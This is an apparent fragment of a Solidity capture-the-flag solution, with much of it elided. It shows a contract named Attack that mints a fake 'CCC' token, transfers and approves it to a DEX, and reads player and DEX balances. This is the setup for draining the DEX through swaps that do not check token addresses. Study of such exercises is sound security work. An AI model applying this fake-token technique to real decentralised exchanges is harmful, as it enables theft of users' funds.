...
contract Attack {
    ...
    constructor() {
        ...
        tokenC = new SwappableToken(address(dex), "CCC", "ccc", 400);
    }
    ...
    function attack() public {
        ...
        tokenC.transfer(address(dex), 100);
        tokenC.approve(address(this), address(dex), 400);
    }
    ...
    {
        playerA = tokenA.balanceOf(address(this));
        playerB = tokenB.balanceOf(address(this));
        playerC = tokenC.balanceOf(address(this));
        dexA = tokenA.balanceOf(address(dex));
        dexB = tokenB.balanceOf(address(dex));
        dexC = tokenC.balanceOf(address(dex));
    }
}
